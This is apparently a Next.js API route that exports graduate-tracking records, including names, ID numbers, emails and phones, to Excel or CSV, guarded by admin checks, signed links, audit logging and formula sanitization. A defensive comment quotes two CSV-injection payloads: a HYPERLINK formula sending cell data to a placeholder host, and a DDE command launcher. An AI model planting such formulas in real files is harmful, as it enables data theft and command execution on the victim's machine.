import { NextRequest, NextResponse } from "next/server";
import { db } from "@/db";
import { personas } from "@/db/schema";
import { eq, and, sql } from "drizzle-orm";
import * as XLSX from "xlsx";
import { exigirAdmin, errorInterno } from "@/lib/guards";
import { aFiltroEnum } from "@/lib/filtros";
import { registrarAuditoria } from "@/lib/auditoria";
import { sanearReporte } from "@/lib/privacidad";
import { verificarDescarga } from "@/lib/descargas";
import { leerSesionVigente } from "@/lib/guards";

export const dynamic = "force-dynamic";

/**
 * GET /api/exportar  (SOLO ADMIN)
 *
 * SEGURIDAD (tres capas):
 *  1. `exigirAdmin`: sin sesión de administrador no se entra.
 *  2. Firma de descarga: la petición debe traer `sig`+`exp` válidos, atados a esta
 *     ruta y a este usuario, con caducidad de 5 minutos. Impide que el enlace se
 *     reutilice desde el historial, un proxy o el `Referer` de otra página.
 *     (ISO/IEC 27001:2022, A.8.12 prevención de fuga de datos.)
 *  3. Sanitización de fórmulas: cada celda se neutraliza antes de serializar.
 *     (A.8.11 enmascarado de datos + A.8.12.)
 *
 * La sesión se sigue validando aunque la firma sea correcta: la firma prueba que el
 * enlace es auténtico y no ha caducado, NO que quien lo usa siga autorizado. Un token
 * revocado debe cortar el acceso aunque el enlace sea de hace un minuto.
 */
export async function GET(request: NextRequest) {
  const denegado = await exigirAdmin(request);
  if (denegado) return denegado;

  try {
    const { searchParams } = new URL(request.url);

    // ── Verificación de la firma de descarga ──────────────────────────────────
    const sesion = await leerSesionVigente(request);
    if (!sesion || sesion.rol !== "admin") {
      // `exigirAdmin` ya lo habría comprobado; se repite explícitamente porque la firma
      // se verifica contra un sujeto y sin sujeto no hay contra qué comparar.
      return NextResponse.json({ error: "Debe iniciar sesión" }, { status: 401 });
    }

    const firma = verificarDescarga(
      "/api/exportar",
      searchParams.get("sig"),
      searchParams.get("exp") ? Number(searchParams.get("exp")) : null,
      searchParams.get("sub"),
      String(sesion.sub)
    );
    if (!firma.valida) {
      await registrarAuditoria({
        accion: "exportar",
        entidad: "personas",
        idUsuario: sesion.sub,
        detalles: `Descarga rechazada por firma inválida (motivo: ${firma.motivo})`,
        req: request,
      });
      return NextResponse.json(
        {
          error:
            firma.motivo === "expirada"
              ? "El enlace de descarga expiró. Genere uno nuevo."
              : "Enlace de descarga no válido.",
          motivo: firma.motivo,
        },
        { status: 403 }
      );
    }
    const tipo = searchParams.get("tipo") || "TODOS"; // TITULADOS, EGRESADOS, TODOS
    const formato = searchParams.get("formato") || "excel"; // excel, csv
    const sector = searchParams.get("sector");
    const modalidad = searchParams.get("modalidad");

    // Construcción de condiciones Drizzle
    const conditions = [];

    // Baja lógica (decisión D3): lo dado de baja queda fuera de los reportes. Para
    // incluirlo hay que pedirlo expresamente con ?incluirBajas=true.
    if (searchParams.get("incluirBajas") !== "true") {
      conditions.push(eq(personas.activo, true), eq(personas.estadoRegistro, "VALIDADO"));
    }

    if (tipo === "TITULADOS") {
      conditions.push(eq(personas.tipo, "TITULADO"));
    } else if (tipo === "EGRESADOS") {
      conditions.push(eq(personas.tipo, "EGRESADO"));
    }

    const anioMinRaw = searchParams.get("anioMin");
    const anioMaxRaw = searchParams.get("anioMax");
    const anioMin = anioMinRaw ? parseInt(anioMinRaw, 10) : null;
    const anioMax = anioMaxRaw ? parseInt(anioMaxRaw, 10) : null;

    if (sector && sector !== "TODOS") {
      const sectorValido = aFiltroEnum(personas.sectorTrabajo, sector);
    if (sectorValido) conditions.push(eq(personas.sectorTrabajo, sectorValido));
    }

    if (modalidad && modalidad !== "TODAS") {
      const modalidadValida = aFiltroEnum(personas.modalidadTitulacion, modalidad, "TODAS");
    if (modalidadValida) conditions.push(eq(personas.modalidadTitulacion, modalidadValida));
    }

    if (anioMin !== null && Number.isFinite(anioMin)) {
      conditions.push(
        sql`COALESCE(${personas.anioTitulacion}, ${personas.anioEgreso}) >= ${anioMin}`
      );
    }

    if (anioMax !== null && Number.isFinite(anioMax)) {
      conditions.push(
        sql`COALESCE(${personas.anioTitulacion}, ${personas.anioEgreso}) <= ${anioMax}`
      );
    }

    // Consulta de registros POR LOTES.
    //
    // Antes era un `select()` sin límite: con la base completa, el proceso se traía
    // todas las filas de golpe y la memoria crecía sin cota. Ahora se lee en páginas de
    // LOTE, así que el pico de memoria por consulta es constante, y el total se conoce
    // por adelantado para poder avisar en la cabecera si el archivo quedó recortado.
    const LOTE = 500;
    const [{ total: totalRegistros }] = (await db
      .select({ total: sql<number>`count(*)::int` })
      .from(personas)
      .where(conditions.length > 0 ? and(...conditions) : undefined)) as [
      { total: number }
    ];

    const registros = [];
    for (let offset = 0; offset < totalRegistros; offset += LOTE) {
      const lote = await db
        .select()
        .from(personas)
        .where(conditions.length > 0 ? and(...conditions) : undefined)
        .orderBy(personas.id)
        .limit(LOTE)
        .offset(offset);
      registros.push(...lote);
    }

    const fechaGeneracion = new Date().toLocaleDateString("es-BO", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });

    // Mapeo a formato de reporte oficial.
    //
    // `sanearReporte` NO es cosmético: sin él, un egresado que escribiera
    // `=HYPERLINK("http://x/?d="&A1,"clic")` en "empresa actual" --o
    // `=cmd|' /C calc'!A0` en versiones antiguas de Excel-- dejaría una fórmula en el
    // archivo que se abre en el equipo del ADMINISTRADOR y se ejecuta con sus
    // privilegios. Eso es CSV injection: un dato de entrada del usuario que cruza el
    // perímetro y se convierte en código ejecutable en la estación de otro.
    const dataReporte = sanearReporte(
      registros.map((r, idx) => ({
        "N°": idx + 1,
        Tipo: r.tipo,
        "Cédula de Identidad (K)": r.cedulaIdentidad,
        "Nombres y Apellidos (K)": r.nombresApellidos,
        "Género (K)": r.genero,
        "Semestre Ingreso (K)": r.semestreIngreso || "—",
        "Semestre Egreso (K)": r.semestreEgreso || "—",
        "Año Titulación (K)": r.anioTitulacion || "—",
        "Modalidad Titulación (K)": r.modalidadTitulacion || "—",
        "Área de Especialización (K)": r.areaEspecializacion || "—",
        "Planea Titularse (Egresados)": r.planeaTitularse || "—",
        "Inició Proceso Titulación": r.inicioProcesoTitulacion || "—",
        "Motivo No Titulación": r.motivoNoTitulacion || "—",
        "Estado Laboral": r.estadoLaboral || "—",
        "Sector de Trabajo": r.sectorTrabajo || "—",
        "Sector Otro (especificado)": r.sectorTrabajo === "OTRO" ? r.sectorTrabajoOtro || "—" : "—",
        "Ocupación / Cargo": r.ocupacionCargo || "—",
        "Trabaja en Estadística": r.trabajaEnEstadistica ? "SÍ" : "NO",
        "Ubicación Geográfica": r.ciudadRegionTrabajo || "—",
        "T. Egreso-Titulación (meses)": r.tiempoEgresoTitulacionMeses ?? "—",
        "T. Inserción Laboral (meses)": r.tiempoInsercionLaboralMeses ?? "—",
        "Correo Electrónico": r.correoElectronico || "—",
        Teléfono: r.telefono || "—",
        "Redes Sociales": r.redesSociales || "—",
        Observaciones: r.observaciones || "—",
        "Carrera": "Estadística",
        "Fecha de Generación": fechaGeneracion,
      }))
    );

    const dateStr = new Date().toISOString().split("T")[0];

    // Exportación a CSV en memoria
    if (formato.toLowerCase() === "csv") {
      const worksheet = XLSX.utils.json_to_sheet(dataReporte);
      const csvOutput = XLSX.utils.sheet_to_csv(worksheet);
      // Añadir BOM para compatibilidad UTF-8 en Excel
      const csvBuffer = Buffer.from("\uFEFF" + csvOutput, "utf-8");

      await registrarAuditoria({
        accion: "exportar",
        entidad: "personas",
        detalles: `Exportación CSV · ${tipo} · ${dataReporte.length} registros`,
        req: request,
      });

      return new NextResponse(csvBuffer, {
        status: 200,
        headers: {
          "Content-Type": "text/csv; charset=utf-8",
          "Content-Disposition": `attachment; filename="Reporte_${tipo}_Estadistica_${dateStr}.csv"`,
          "Cache-Control": "no-store, max-age=0",
        },
      });
    }

    // Exportación a Excel (.xlsx) en memoria
    const workbook = XLSX.utils.book_new();

    // Encabezado institucional UMSA / Estadística
    const headerMetadata = [
      ["UNIVERSIDAD MAYOR DE SAN ANDRÉS - FACULTAD DE CIENCIAS PURAS Y NATURALES"],
      ["CARRERA DE ESTADÍSTICA - SISTEMA DE SEGUIMIENTO A TITULADOS Y EGRESADOS"],
      [`REPORTE OFICIAL DE SEGUIMIENTO (${tipo})`],
      [`Fecha de Generación: ${fechaGeneracion}`, `Total de Registros: ${dataReporte.length}`],
      [], // Fila en blanco
    ];

    const worksheet = XLSX.utils.aoa_to_sheet(headerMetadata);
    XLSX.utils.sheet_add_json(worksheet, dataReporte, {
      origin: "A6",
      skipHeader: false,
    });

    // Ajuste de anchos de columna
    worksheet["!cols"] = [
      { wch: 6 },  // N°
      { wch: 12 }, // Tipo
      { wch: 16 }, // CI
      { wch: 30 }, // Nombres
      { wch: 14 }, // Genero
      { wch: 16 }, // Sem Ingreso
      { wch: 18 }, // Sem Egreso
      { wch: 14 }, // Año Titulacion
      { wch: 22 }, // Modalidad
      { wch: 25 }, // Especializacion
      { wch: 15 }, // Planea titularse
      { wch: 15 }, // Inicio proceso
      { wch: 20 }, // Motivo no titulacion
      { wch: 16 }, // Estado laboral
      { wch: 16 }, // Sector
      { wch: 30 }, // Sector Otro (especificado)
      { wch: 25 }, // Ocupacion
      { wch: 14 }, // Trabaja estadistica
      { wch: 22 }, // Ubicacion
      { wch: 16 }, // T Egreso-Titulacion
      { wch: 16 }, // T Insercion
      { wch: 25 }, // Correo
      { wch: 16 }, // Telefono
      { wch: 20 }, // Redes
      { wch: 30 }, // Observaciones
    ];

    XLSX.utils.book_append_sheet(workbook, worksheet, `Seguimiento_${tipo}`);

    // Generar Buffer binario en memoria RAM
    const excelBuffer = XLSX.write(workbook, {
      type: "buffer",
      bookType: "xlsx",
    });

    await registrarAuditoria({
      accion: "exportar",
      entidad: "personas",
      detalles: `Exportación Excel · ${tipo} · ${dataReporte.length} registros`,
      req: request,
    });

    return new NextResponse(excelBuffer, {
      status: 200,
      headers: {
        "Content-Type":
          "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "Content-Disposition": `attachment; filename="Reporte_${tipo}_Estadistica_${dateStr}.xlsx"`,
        "Cache-Control": "no-store, max-age=0",
      },
    });
  } catch (error: unknown) {
    return errorInterno(error, "api/exportar");
  }
}
